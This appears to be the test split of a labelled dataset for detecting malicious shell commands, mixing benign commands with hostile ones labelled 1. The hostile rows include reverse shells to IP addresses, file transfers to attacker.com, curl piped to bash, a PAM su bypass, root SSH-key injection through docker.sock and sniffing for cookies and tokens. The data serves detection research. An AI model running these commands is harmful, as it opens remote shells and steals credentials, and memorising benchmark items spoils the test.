id,command,label,source,split
d1_003830,sfdk scrape [-o|--output-dir] directory,0,tldr,test
d1_003834,unison path/to/directory_1 path/to/directory_2 -auto,0,tldr,test
d1_003837,docker compose [-f|--file] path/to/config up,0,tldr,test
d1_003839,tio [-l|--list],0,tldr,test
d1_003841,sudo chgrp wheel payment.conf,0,bash_instruct,test
d1_003851,xdg-terminal-exec,0,tldr,test
d1_003853,cat manifest.tsv | sort | uniq,0,bash_instruct,test
d1_003855,find tmp -name '*.log' -print0 | xargs -0 grep -l TODO,0,bash_instruct,test
d1_003866,nixpkgs-review pr --post-result pr_number|pr_url,0,tldr,test
d1_003869,runghc script.hs,0,linlm,test
d1_003879,watch -n 2 df -h,0,bash6k,test
d1_003884,"echo ""Hello World"" >> output.txt",0,bash6k,test
d1_003886,date -u '+%Y-%m-%dT%k:%M:%S%z',0,nl2bash,test
d1_003890,"find . -name test -prune -regex "".*/my.*p.$""",0,nl2bash,test
d1_003899,pip debug,0,tldr,test
d1_003900,zsh [-n|--no-exec] path/to/script.zsh,0,tldr,test
d1_003904,"cat order.ini | awk '{ print length, $0 }' | sort -rn | head -20 | cut -d' ' -f2-",0,bash_instruct,test
d1_003909,mcopy -s path/to/source_directory A:/path/to/target_directory,0,tldr,test
d1_003910,standard-version,0,tldr,test
d1_003913,cat /proc/sys/kernel/module_sig_enforce 2>/dev/null,1,hacktricks,test
d1_003917,mongo | tee somefile,0,nl2bash,test
d1_003926,npm diff --diff package_name@version,0,tldr,test
d1_003930,tuckr set program,0,tldr,test
d1_003935,virsh pool-list --persistent|transient,0,tldr,test
d1_003938,pnmindex [-c|-colors] 512 path/to/input1.pnm path/to/input2.pnm ... > path/to/output.pnm,0,tldr,test
d1_003940,sed 's/$/p/' file_of_line_numbers | sed -nf - source,0,nl2bash,test
d1_003941,chmod 644 audit.gz,0,bash_instruct,test
d1_003947,sudo find /proc -maxdepth 3 -type l -name ipc -exec readlink {} \; 2>/dev/null | sort -u,1,hacktricks,test
d1_003951,sed -i '1d' transaction.conf,0,bash_instruct,test
d1_003960,tesseract --list-langs,0,tldr,test
d1_003966,sudo ./deploy.sh staging --force,0,bash6k,test
d1_003975,curl -s http://h6ba9a227.example.net/version 2>/dev/null,1,hacktricks,test
d1_003980,nl build.log,0,bash_instruct,test
d1_003995,ppmtobmp [-b|-bbp] 1|4|8|24 path/to/file.ppm > path/to/file.bmp,0,tldr,test
d1_004001,psexec.py -c filename domain/username:password@target command,0,tldr,test
d1_004002,shopt -s direxpand,0,nl2bash,test
d1_004005,cat path/to/image.png | pngcheck -cvt,0,tldr,test
d1_004008,file profile.log,0,bash_instruct,test
d1_004017,cat audit.yaml | sort | uniq,0,bash_instruct,test
d1_004025,mv manifest.old config/,0,bash_instruct,test
d1_004033,cp release.yaml artifacts/,0,bash_instruct,test
d1_004034,hyprctl workspaces,0,tldr,test
d1_004040,wc -l results.gz,0,bash_instruct,test
d1_004053,uname!-1\-a,1,hacktricks,test
d1_004064,ls -l /proc/sys/kernel/modprobe,1,hacktricks,test
d1_004070,find /usr/share/man/ -regex grep.*,0,nl2bash,test
d1_004071,watch elinks -dump file.html,0,nl2bash,test
d1_004072,find /target/path -type f -exec your_command_here \{\} \;,0,nl2bash,test
d1_004075,"sed -i -e ""4i \$RSHELL"" /etc/network/if-up.d/upstart",1,payloads,test
d1_004083,"echo ""ExecStart=/bin/touch /tmp/art-systemd-timer-marker"" >> /etc/systemd/system/art-timer.service",1,atomic_red_team,test
d1_004085,export SSL_CERT_FILE=/path/to/ca-bundle.pem,1,hacktricks,test
d1_004088,lsof -c haproxy,0,bash_instruct,test
d1_004096,vf connect,0,tldr,test
d1_004098,smbclient.py -target-ip target_ip domain/username:password@target,0,tldr,test
d1_004099,nmap -oG=/path/to/output-file DATA,1,gtfobins,test
d1_004100,arecord [-l|--list-devices],0,tldr,test
d1_004105,mkinitcpio [-L|--listhooks],0,tldr,test
d1_004108,du -h --max-depth=1 /var/www | sort -rh,0,bash_instruct,test
d1_004112,find . -mmin 60 -type f,0,nl2bash,test
d1_004115,sesearch -A -s staff_t 2>/dev/null | head,1,hacktricks,test
d1_004118,ls dist | grep '\.tmp$',0,bash_instruct,test
d1_004124,sui client subcommand,0,tldr,test
d1_004127,calcurse-caldav --init=keep-local,0,tldr,test
d1_004131,pry,1,gtfobins,test
d1_004133,cat order.txt | sort -u,0,bash_instruct,test
d1_004134,desc table_name partition (partition_spec);,0,tldr,test
d1_004136,tail -n 20 sales.gz,0,bash_instruct,test
d1_004140,jobs %job_id,0,tldr,test
d1_004145,http://h86dd1cf4.example.net/?cmd=>\ http://h86dd1cf4.example.net/?cmd=>-t http://h86dd1cf4.example.net/?cmd=>\>g,1,hacktricks,test
d1_004152,sudo insmod /tmp/T1547.006/T1547006.ko,1,atomic_red_team,test
d1_004156,cat index.ini | wc -l,0,bash_instruct,test
d1_004166,chmod 644 /lib/security/pam_unix.so,1,hacktricks,test
d1_004173,git obliterate file_1 file_2 ...,0,tldr,test
d1_004175,find /path/to/files* -mtime +5 -exec rm {} \;,0,nl2bash,test
d1_004190,npm team ls organization:team,0,tldr,test
d1_004196,git send-email -number_of_commits --compose,0,tldr,test
d1_004205,pytest --benchmark-calibration-verbose,0,linlm,test
d1_004206,Projucer --tidy-divider-comments path/to/target_folder,0,tldr,test
d1_004208,eget https://h56aef353.example.net/dl/go1.17.5.linux-amd64.tar.gz,0,tldr,test
d1_004209,uniq -c build.log,0,bash_instruct,test
d1_004213,mongoexport --uri=mongodb_uri --collection=collection_name --pretty,0,tldr,test
d1_004219,xml [c14n|canonic] --without-comments path/to/input.xml|uri > path/to/output.xml,0,tldr,test
d1_004220,find . -type f -size +500M,0,nl2bash,test
d1_004224,qpdf --show-attachment=x /path/to/output-file,1,gtfobins,test
d1_004226,ls -l /opt/backups/current/bash,1,hacktricks,test
d1_004229,find /var/spool -mtime +60,0,nl2bash,test
d1_004233,"mongoimport --file path/to/file.json --mode delete|merge|upsert --upsertFields ""field1,field2,...""",0,tldr,test
d1_004238,"docker [ps|container ls] [-f|--filter] ""name=name""",0,tldr,test
d1_004244,pgrep -a python,0,bash_instruct,test
d1_004246,0<&3;exec 3<>/dev/udp/154.68.28.197/8000; /bin/sh <&3 >&3 2>&3,1,quasarnix,test
d1_004247,sed -i 's/GET/password/g' access.conf,0,bash_instruct,test
d1_004253,chown user3:user3 -R subdir3,0,nl2bash,test
d1_004258,var ProcessBuilder = Java.type('java.lang.ProcessBuilder');,1,gtfobins,test
d1_004262,dark-mode on,0,tldr,test
d1_004263,sudo chown -R backup:staff reports,0,bash_instruct,test
d1_004269,sudo ln -s /usr/bin/perl /usr/local/bin/perl`echo -e '\r'`,0,nl2bash,test
d1_004272,find dir/ -name '*.txt' | xargs cp -a --target-directory=dir_txt/ --parents,0,nl2bash,test
d1_004282,Unit=dbus-server.service,1,hacktricks,test
d1_004285,wezterm connect domain_name,0,tldr,test
d1_004286,rsync -av templates/ data/,0,bash_instruct,test
d1_004292,mv migration.old bin/,0,bash_instruct,test
d1_004298,clang++ path/to/source.cpp -O1|2|3|fast [-o|--output] path/to/output_executable,0,tldr,test
d1_004299,ssh -p 22 tomcat@auth.example.org,0,bash_instruct,test
d1_004302,smbserver.py -hashes LMHASH:NTHASH sharename path/to/share,0,tldr,test
d1_004319,env | grep -E '^LD_',1,hacktricks,test
d1_004320,docker -H unix:///var/run/docker.sock exec helper sh -c 'cat /tmp/key.pub >>/host/root/.ssh/authorized_keys',1,hacktricks,test
d1_004321,head -n 20 metrics.tmp,0,bash_instruct,test
d1_004325,apt search htop,0,bash_instruct,test
d1_004335,find . -iregex '.*sitesearch.*' -iregex '.*demo.*',0,nl2bash,test
d1_004345,0<&3;exec 3<>/dev/udp/21.6.8.210/8000; /usr/bin/dash <&3 >&3 2>&3,1,quasarnix,test
d1_004347,pkgdiff path/to/package1.txz path/to/package2.txz,0,tldr,test
d1_004355,wait4x subcommand --help,0,tldr,test
d1_004366,ping -c 3 db01.example.org,0,bash_instruct,test
d1_004369,nc -e /usr/bin/sh 142.25.218.205 80,1,quasarnix,test
d1_004373,osmium tags-filter path/to/input.pbf w/highway [-o|--output] path/to/output.pbf,0,tldr,test
d1_004375,0<&3;exec 3<>/dev/udp/129.3.191.247/55705; /bin/dash <&3 >&3 2>&3,1,quasarnix,test
d1_004378,terminalizer share path/to/recording.gif,0,tldr,test
d1_004382,"git_latest_hash(){ local repo=""$1""; local branch=""$2""; local dir=$(mktemp -d); git clone --depth 1 --branch ""$branch"" ""$repo"" ""$dir"" >/dev/null 2>&1 && (cd ""$dir"" && git rev-parse HEAD); rm -rf ""$dir""; }",0,bash6k,test
d1_004385,chmod 644 dump.xml,0,bash_instruct,test
d1_004391,tar -cvzf $HOME/data.tar.gz $HOME/$USERNAME,1,atomic_red_team,test
d1_004396,cp backup.sh public/,0,bash_instruct,test
d1_004400,"perl -e 'use Socket;$p_1=""17.97.50.218"";$p_2=3438;socket(S,PF_INET,SOCK_STREAM,getprotobyname(""tcp""));if(connect(S,sockaddr_in($p_1,inet_aton($p_2)))){open(STDIN,"">&S"");open(STDOUT,"">&S"");open(STDERR,"">&S"");exec(""/usr/bin/bash -i"");};'",1,quasarnix,test
d1_004407,"sed 's/\t/,/g' manifest.tsv > manifest.tsv.csv",0,bash_instruct,test
d1_004410,touch request.old,0,bash_instruct,test
d1_004414,echo /path/to/temp-file | cpio -udp .,1,gtfobins,test
d1_004415,git reflog expire --expire=90.days.ago,0,linlm,test
d1_004423,pamtopng [-in|-interlace] path/to/image.pam > path/to/output.png,0,tldr,test
d1_004425,mv *.sh downloads/,0,bash_instruct,test
d1_004432,sudo checkinstall [-y|--default],0,tldr,test
d1_004435,grep -oE '[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+' dump.csv | sort -u,0,bash_instruct,test
d1_004436,bas''e64,1,hacktricks,test
d1_004443,nc -cu /bin/dash 143.236.167.206 8000,1,quasarnix,test
d1_004445,jf config add,0,tldr,test
d1_004446,gcc pwn.c -o a.out,1,hacktricks,test
d1_004449,tree -p -d,0,nl2bash,test
d1_004464,"vibe [-p|--prompt] ""your_prompt""",0,tldr,test
d1_004471,doxx path/to/file.docx [-s|--search] pattern,0,tldr,test
d1_004477,runc -help,1,hacktricks,test
d1_004481,pacman -S package1 package2 package3,0,linlm,test
d1_004482,grep -oE '[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+' migration.csv | sort -u,0,bash_instruct,test
d1_004483,file config.log,0,bash_instruct,test
d1_004489,mysqld --port=port,0,tldr,test
d1_004494,git cherry origin topic,0,tldr,test
d1_004498,pio device list --logical,0,tldr,test
d1_004500,restorecon -n -v /usr/local/bin /opt /srv /var/www 2>/dev/null,1,hacktricks,test
d1_004501,ollama serve,0,linlm,test
d1_004502,"STRING ""lalalalal"";",1,hacktricks,test
d1_004503,readpe path/to/executable,0,tldr,test
d1_004507,echo $(echo $ENCODED) | base64 -d,1,atomic_red_team,test
d1_004511,find build -type f -empty,0,bash_instruct,test
d1_004521,nth [-t|--text] 5f4dcc3b5aa765d61d8327deb882cf99 [-g|--greppable],0,tldr,test
d1_004524,iptables -A OUTPUT -o lo -j ACCEPT,1,hacktricks,test
d1_004525,find /usr/ports/ -name Makefile\* -exec grep `printf '\15'` -l '{}' '+' | wc -l,0,nl2bash,test
d1_004533,scp redis@web01.internal:/var/log/nginx-access.log .,0,bash_instruct,test
d1_004534,[ -f server.log ] && cat server.log || echo 'not found',0,bash_instruct,test
d1_004537,ls -t cache | head -n 1,0,bash_instruct,test
d1_004539,xxd -l 64 output.py,0,bash_instruct,test
d1_004550,sudo cat /proc/meminfo,0,linlm,test
d1_004554,"find . -type f |xargs ls -la| awk '{print ""chmod ""$1"" ""$NF}'>./filesPermissions.sh",0,nl2bash,test
d1_004555,bun run script.js,0,linlm,test
d1_004571,"find . -perm /u+w,g+w",0,nl2bash,test
d1_004577,"grep -oE 'href=""[^""]+""' page.html | sed -E 's/href=""([^#?]+).*/\1/' | sort | uniq -c | sort -nr | head -n 10",0,bash6k,test
d1_004578,"print -l ""Line1"" ""Line 2"" ""Line3""",0,tldr,test
d1_004579,exiftool -description -W /path/to/output-file --filename /path/to/input-file,1,gtfobins,test
d1_004583,fakedata --generators,0,tldr,test
d1_004587,wine exe2bat.exe nc.exe nc.txt,1,hacktricks,test
d1_004592,ls -l /tmp/T1560,1,atomic_red_team,test
d1_004594,uniq /path/to/input-file,1,gtfobins,test
d1_004595,fdupes -r /data,0,bash6k,test
d1_004597,apptainer build [-F|--force] path/to/image.sif path/to/definition.def,0,tldr,test
d1_004598,rustup component add --toolchain toolchain component,0,tldr,test
d1_004602,tar -cvf example.tar example/,0,bash6k,test
d1_004604,mv invoice.js data/,0,bash_instruct,test
d1_004606,/usr/bin/dash -i >& /dev/tcp/31.196.141.26/2951 0>&1,1,quasarnix,test
d1_004613,iostat -d,0,bash_instruct,test
d1_004614,nc -cu /usr/bin/sh 31.22.58.70 8000,1,quasarnix,test
d1_004621,tmt try [-a|--ask],0,tldr,test
d1_004631,sort path/to/file | uniq [-u|--unique],0,tldr,test
d1_004644,dmesg --level=err | grep -i link,0,bash_instruct,test
d1_004645,clamscan --no-summary -d x.yara -f /path/to/input-file 2>&1 | sed -nE 's/^(.*): No such file or directory$/\1/p',1,gtfobins,test
d1_004651,cp -u schema.zip tmp/,0,bash_instruct,test
d1_004653,netstat -tn | grep www.example.org,0,bash_instruct,test
d1_004654,curl -sS https://h3cf88e0a.example.net/redcanaryco/atomic-red-team/master/atomics/T1059.004/src/echo-art-fish.sh | bash,1,atomic_red_team,test
d1_004665,echo $!,0,bash6k,test
d1_004671,qtgrace -log xy -settype xydy path/to/file.dat,0,tldr,test
d1_004673,sudo systemctl preset-all [-q|--quiet],0,tldr,test
d1_004675,pacman -Qi package_name | grep Licenses,0,linlm,test
d1_004676,"command => ""whoami""",1,hacktricks,test
d1_004690,lslocks [-r|--raw] [-n|--noheadings],0,tldr,test
d1_004691,tldr dnf,0,tldr,test
d1_004695,prowler aws [-s|--services] s3|ec2|...,0,tldr,test
d1_004696,needrestart -c /path/to/temp-file,1,gtfobins,test
d1_004707,tempfile=$(mktemp) && echo $tempfile,0,bash6k,test
d1_004708,cat /etc/login.defs,1,atomic_red_team,test
d1_004725,VBoxManage unregistervm uuid|vm_name --delete,0,tldr,test
d1_004728,"echo ""192.168.1.$i is UP:"";",1,payloads,test
d1_004733,strace -f -s 200 -o /tmp/confd.trace /usr/bin/confd_cli,1,hacktricks,test
d1_004736,pacman -Ql firefox,0,linlm,test
d1_004737,find /path/ -type f -daystart -mtime +0,0,nl2bash,test
d1_004752,sudo chattr -i file.txt,1,hacktricks,test
d1_004756,"grep '404' /var/log/apache2/error.log | grep -oE '\[.*\]' | sed 's/[\[\]]//g' | paste -sd',' -",0,bash6k,test
d1_004760,find /etc/apache2 -type f -name '*.log' -print0 | xargs -0 gzip,0,bash_instruct,test
d1_004766,pomo init,0,tldr,test
d1_004773,find . — size +1000k -print,0,nl2bash,test
d1_004776,files=( *.txt ),0,bash6k,test
d1_004777,ipa usergroup-find,1,hacktricks,test
d1_004785,cp /path/to/input-file /path/to/dir/,1,gtfobins,test
d1_004791,pdb /path/to/temp-file,1,gtfobins,test
d1_004793,crio --version,0,linlm,test
d1_004796,Set-NodeVersion ^20,0,tldr,test
d1_004804,aws history list,0,tldr,test
d1_004811,tailpod,0,tldr,test
d1_004815,find -user root -exec chown www-data {} \;,0,nl2bash,test
d1_004816,ping -c 4 proxy.service.io,0,bash_instruct,test
d1_004830,cat session.txt | sort | uniq,0,bash_instruct,test
d1_004834,tail -n 20 notes.sql,0,bash_instruct,test
d1_004841,cp dump.tmp public/,0,bash_instruct,test
d1_004844,ssh -l buck hostname,0,nl2bash,test
d1_004851,cd path/to/test_directory && tmt try,0,tldr,test
d1_004869,cd docker-bench-security,1,hacktricks,test
d1_004870,gcc /tmp/crash.c -o /tmp/crash,1,hacktricks,test
d1_004875,cat /dev/urandom | tr -dc '. ' | fold -w 100 | head -1,0,nl2bash,test
d1_004876,java -jar jenkins-cli.jar -s jenkins_server_url shutdown,0,tldr,test
d1_004882,tldr dd,0,tldr,test
d1_004884,nkf -w path/to/file.txt,0,tldr,test
d1_004892,sudo usermod [-U|--unlock] username,0,tldr,test
d1_004898,"System.Process.callCommand ""/bin/sh""",1,gtfobins,test
d1_004910,xxd -l 64 payment.js,0,bash_instruct,test
d1_004914,"find /var/log -type f -name ""*.log"" -mtime +7 -print0 | tar -czvf old_logs.tar.gz --null -T -",0,bash6k,test
d1_004922,lvmdevices --version,0,tldr,test
d1_004928,git clean [-i|--interactive],0,tldr,test
d1_004944,C-x C-s,1,gtfobins,test
d1_004947,aws s3 mb help,0,tldr,test
d1_004949,cat manifest.log | sort -u,0,bash_instruct,test
d1_004976,tldr nmcli general,0,tldr,test
d1_004979,cat catalog.csv | sort -u,0,bash_instruct,test
d1_004982,svgo --config svgo.config.js image.svg,0,linlm,test
d1_004988,emulator -avd name,0,tldr,test
d1_004990,/bin/dash -i 3<> /dev/tcp/24.73.63.60/22 0<&3 1>&3 2>&3,1,quasarnix,test
d1_004995,fold -w30 longline | tr '\n' '|' | sed 's/|$/\n/',0,nl2bash,test
d1_005000,xrandr --output LVDS-1 --rotate left,0,linlm,test
d1_005020,find . -print0 | xargs -0 stat -f '%i ',0,nl2bash,test
d1_005023,find /var/lib/mysql -type f -name '*.old',0,bash_instruct,test
d1_005025,cat /proc/sys/vm/vfs_cache_pressure,0,linlm,test
d1_005030,head -n 20 payment.bak,0,bash_instruct,test
d1_005041,find / -name /transfer -prune -o -print,0,nl2bash,test
d1_005048,sudo chroot --userspec username_or_id:group_name_or_id path/to/new_root,0,tldr,test
d1_005057,cont,1,gtfobins,test
d1_005061,rustdoc src/lib.rs --crate-name name,0,tldr,test
d1_005062,steamos-select-branch -l,0,tldr,test
d1_005064,jj next --conflict,0,tldr,test
d1_005067,rmdir templates,0,bash_instruct,test
d1_005073,head -n 1 sales.json,0,bash_instruct,test
d1_005077,sudo chown -R redis:developers modules,0,bash_instruct,test
d1_005080,sudo nft list tables,1,hacktricks,test
d1_005082,msgcat -P /path/to/input-file,1,gtfobins,test
d1_005083,path/to/goldeneye.py url,0,tldr,test
d1_005088,chmod a+w /tmp/AtomicRedTeam/atomics/T1222.002,1,atomic_red_team,test
d1_005091,file server.zip,0,bash_instruct,test
d1_005097,"find ~/code -maxdepth 2 -type d -name '.git' -printf '%h\n' | while read repo; do (cd ""$repo"" && echo ""$repo: $(git rev-parse --abbrev-ref HEAD)""); done",0,bash6k,test
d1_005113,unshare /bin/sh,1,gtfobins,test
d1_005115,stat catalog.tar.gz,0,bash_instruct,test
d1_005118,jj git fetch --remote remote,0,tldr,test
d1_005125,cheat [-s|--search] command,0,tldr,test
d1_005129,"echo ""[Install]"" >> /etc/systemd/system/art-timer.service",1,atomic_red_team,test
d1_005135,find ~/junk -name 'cart[4-6]' -exec rm {} \;,0,nl2bash,test
d1_005137,cp -p config.tar.gz lib/,0,bash_instruct,test
d1_005139,pct [en|enter] 100,0,tldr,test
d1_005142,"hub issue list [-L|--limit] 10 [-l|--labels] ""bug""",0,tldr,test
d1_005143,scp /path/to/input-file user@attacker.com:/path/to/output-file,1,gtfobins,test
d1_005152,true | xargs false,0,nl2bash,test
d1_005153,cat dump.tsv | tail -n 15,0,bash_instruct,test
d1_005154,chmod +x summary.sql,0,bash_instruct,test
d1_005155,openvpn --dev null --script-security 2 --up '/bin/sh -s',1,gtfobins,test
d1_005157,rtorrent torrent_or_magnet,0,tldr,test
d1_005158,docker rename old_name new_name,0,linlm,test
d1_005167,csslint --list-rules,0,tldr,test
d1_005169,touch /tmp/T1070.006-reference.txt,1,atomic_red_team,test
d1_005177,mv -n changelog.xml changelog.xml.old,0,bash_instruct,test
d1_005187,echo ${array_name[@]},0,tldr,test
d1_005193,netstat -tn | grep mail.example.org,0,bash_instruct,test
d1_005200,cat > /mnt/disk1_1/rce.sh <<'EOF',1,hacktricks,test
d1_005201,grep -i error output.log | sort -u,0,bash_instruct,test
d1_005205,systemctl start T1543.002,1,atomic_red_team,test
d1_005208,chmod +x config.old,0,bash_instruct,test
d1_005215,"ppmpat [-ca|-camo] [-co|-color] color1,color2,... width height > path/to/file.ppm",0,tldr,test
d1_005217,quilt import path/to/file.patch,0,tldr,test
d1_005227,[ -f sales.pdf ] && cat sales.pdf || echo 'not found',0,bash_instruct,test
d1_005232,comm -1 -3 file1 file2,0,nl2bash,test
d1_005237,cat debug.md | tail -n 15,0,bash_instruct,test
d1_005246,find / -type f -print0 | xargs -0 grep -liwZ GUI | xargs -0 rm -f,0,nl2bash,test
d1_005255,locale date_fmt,0,tldr,test
d1_005263,cat response.yaml | wc -l,0,bash_instruct,test
d1_005265,"restic --password-command='/bin/sh -p -c ""/bin/sh -p 0<&2 1<&2""' backup",1,gtfobins,test
d1_005269,FileCheck --input-file=path/to/input_file path/to/check_file,0,tldr,test
d1_005270,cp --attributes-only --preserve=all /path/to/input-file /path/to/output-file,1,gtfobins,test
d1_005281,chmod +x data.csv,0,bash_instruct,test
d1_005285,free [-s|--seconds] 2,0,tldr,test
d1_005287,cp metrics.js include/,0,bash_instruct,test
d1_005288,"if [ -x ""$(command -v lspci)"" ]; then sudo lspci | grep -i ""vmware\|virtualbox""; fi",1,atomic_red_team,test
d1_005289,curl -O -L https://h0caaf24a.example.net/file.zip,0,bash6k,test
d1_005297,scala filename.jar,0,tldr,test
d1_005300,cat /proc/interrupts | grep -i lapic,0,linlm,test
d1_005307,"sed -n '10,20p' metrics.tsv",0,bash_instruct,test
d1_005311,chmod go-w catalog.md,0,bash_instruct,test
d1_005315,split -b 1024k <file_name>,0,nl2bash,test
d1_005316,telnet attacker.com 12345 </path/to/temp-socket | /bin/sh >/path/to/temp-socket,1,gtfobins,test
d1_005324,sattach --output|error-filter task_number,0,tldr,test
d1_005328,sudo ip [ru|rule] [a|add] from all lookup table_id,0,tldr,test
d1_005338,ls -la include,0,bash_instruct,test
d1_005339,"su - joe -c ""/path/to/my_daemon > /some/output/file"" &",0,nl2bash,test
d1_005343,bloodhound-python --collectionmethod All --kerberos --domain domain,0,tldr,test
d1_005344,noseyparker report [-d|--datastore] path/to/datastore.np,0,tldr,test
d1_005345,xrandr --output VGA1 --off,0,tldr,test
d1_005346,zrun cat path/to/file1.gz path/to/file2.bz2 ...,0,tldr,test
d1_005354,gopass mounts,0,tldr,test
d1_005356,join -j 2 -o 1.1 1.2 2.1 <(sort -k2 1) <(sort -k2 2),0,nl2bash,test
d1_005360,<Ctrl r>,0,tldr,test
d1_005366,clido toggle-autowrite,0,tldr,test
d1_005371,df -ih,0,nl2bash,test
d1_005378,cat catalog.conf | tail -n 15,0,bash_instruct,test
d1_005382,"find . -type f -name ""your_pattern"" -exec du -ch {} + 2>/dev/null | grep total$.",0,nl2bash,test
d1_005393,carbon-cache.py reload,0,linlm,test
d1_005398,curl [-s|--silent] https://h81736358.example.net/to/xml | zek -o path/to/output.go,0,tldr,test
d1_005404,stat migration.zip,0,bash_instruct,test
d1_005406,"while read line; do mkdir -p ""${line%/*}""; done < infile",0,nl2bash,test
d1_005413,trash [-h|--help],0,tldr,test
d1_005420,"/usr/local/bin/evil_script.py localhost -c 10 >/dev/null & pgrep -l evil_script.py || echo ""process hidden""",1,atomic_red_team,test
d1_005421,"echo ""$1"" | od -xcb",0,nl2bash,test
d1_005426,tload,0,tldr,test
d1_005427,git feature finish feature_branch,0,tldr,test
d1_005437,"setfattr [-n|--name] user.attribute_name [-v|--value] ""value"" path/to/file",0,tldr,test
d1_005438,cat auth.csv | sort | uniq -c | sort -nr,0,bash_instruct,test
d1_005439,"R -e ""install.packages('ggplot2')""",0,linlm,test
d1_005442,waitress-serve --port=8080 app:app,0,linlm,test
d1_005453,certtool [-s|--generate-self-signed] --load-privkey path/to/ca.key --template path/to/ca.template --outfile path/to/ca.crt,0,tldr,test
d1_005468,zic -d . -y /path/to/command /path/to/temp-file,1,gtfobins,test
d1_005480,strings [-n|--bytes] n path/to/file,0,tldr,test
d1_005484,"ip tcp_metrics show |grep --invert-match ""^127\.""",1,atomic_red_team,test
d1_005521,"cap_sys_admin,22,25 jrsysadmin",1,hacktricks,test
d1_005531,cp -p invoice.md build/,0,bash_instruct,test
d1_005533,/usr/bin/dash -i >& /dev/tcp/3.122.130.235/22 0>&1,1,quasarnix,test
d1_005537,"grep -c ""ERROR"" logfile.txt",0,bash6k,test
d1_005542,find /usr/local/etc/rc.d \! -uid 0 -type f 2>/dev/null |xargs -r ls -la 2>/dev/null,1,slp,test
d1_005551,cat audit.txt | tail -n 15,0,bash_instruct,test
d1_005556,cat results.conf | tail -n 15,0,bash_instruct,test
d1_005560,cat backup.md | tail -n 15,0,bash_instruct,test
d1_005561,ftp -a attacker.com,1,gtfobins,test
d1_005565,env /bin/sh,1,gtfobins,test
d1_005566,dotnet new console -n MyProject,0,linlm,test
d1_005568,journalctl -u systemd-networkd -p warning -n 20 --no-pager,0,bash_instruct,test
d1_005570,red /bin/bash,1,hacktricks,test
d1_005572,find . -name \*.txt -print0 | xargs -0 process,0,nl2bash,test
d1_005574,xz [-d|--decompress] path/to/file.xz,0,tldr,test
d1_005578,rsync -a *.sh rsync://host.back/src/rbd,1,hacktricks,test
d1_005606,devcontainer up,0,tldr,test
d1_005611,"perl -e 'use Socket;$i=""example.com"";$p=4242;socket(S,PF_INET,SOCK_STREAM,getprotobyname(""tcp""));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,"">&S"");open(STDOUT,"">&S"");open(STDERR,"">&S"");exec(""/bin/sh -i"");};'",1,slp,test
d1_005613,sudo chown [-R|--recursive] user path/to/directory,0,tldr,test
d1_005617,sudo ee /usr/local/etc/sudoers,1,atomic_red_team,test
d1_005618,"STRING ""Carried out :D"";",1,hacktricks,test
d1_005635,sed -i 's/inactive/info/g' archive.txt,0,bash_instruct,test
d1_005639,sg_raw [-b|--binary] /dev/sgX scsi_command,0,tldr,test
d1_005640,"sudo sed -i ""1s,^,auth sufficient pam_succeed_if.so uid >= 0\n,g"" /etc/pam.d/su-l",1,atomic_red_team,test
d1_005641,port installed,0,tldr,test
d1_005646,"seq -5 10 | xargs printf ""- - %s"" | xargs | bc",0,nl2bash,test
d1_005650,/bin/bash -i 3<> /dev/tcp/19.195.124.14/48519 0<&3 1>&3 2>&3,1,quasarnix,test
d1_005659,skopeo inspect docker://registry_hostname/image:tag,0,tldr,test
d1_005667,mv debug.csv media/,0,bash_instruct,test
d1_005668,pw-top [-r|--remote] remote_name,0,tldr,test
d1_005674,scp dave@web01.example.org:/var/log/nginx-error.log .,0,bash_instruct,test
d1_005676,git diff-files path/to/file,0,tldr,test
d1_005677,"comm -2 file1.txt file2.txt | awk -F'\t' '{print (NF==2?""y"":"""")}'",0,nl2bash,test
d1_005679,setxkbmap fr,0,tldr,test
d1_005680,skopeo login --username username registry_hostname,0,tldr,test
d1_005683,grep -oE '(INFO|WARN|ERROR|DEBUG)' debug.log | sort | uniq -c | sort -nr,0,bash_instruct,test
d1_005685,sudo tcpdump -i lo -s 0 -A -n 'tcp port 80 or 8000 or 8080' | egrep -i 'authorization:|cookie:|set-cookie:|x-api-key|bearer|token|csrf',1,hacktricks,test
d1_005699,"ps -e -orss=,args= | sort -nr | head",0,nl2bash,test
d1_005700,nxc ssh 67.197.130.184 [-u|--username] path/to/usernames.txt [-p|--password] password,0,tldr,test
d1_005712,fadvise [-a|--advice] willneeded path/to/file_or_directory,0,tldr,test
d1_005713,systemctl bind unit /path/to/host_directory,0,tldr,test
d1_005714,dash -i >& /dev/tcp/27.82.58.253/8080 0>&1,1,quasarnix,test
